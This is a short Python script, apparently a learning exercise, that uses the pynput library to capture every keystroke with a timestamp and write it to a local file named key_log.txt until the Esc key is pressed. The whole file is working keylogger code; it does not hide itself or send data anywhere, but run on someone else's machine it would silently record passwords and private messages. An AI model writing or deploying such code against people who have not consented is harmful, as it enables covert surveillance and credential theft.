from pynput.keyboard import Key, Listener
import logging

print("Mitali Madhusmita")
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG,
                    format='%(asctime)s:%(message)s:')

def on_press(key):
    logging.info(f"Key {key} pressed")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
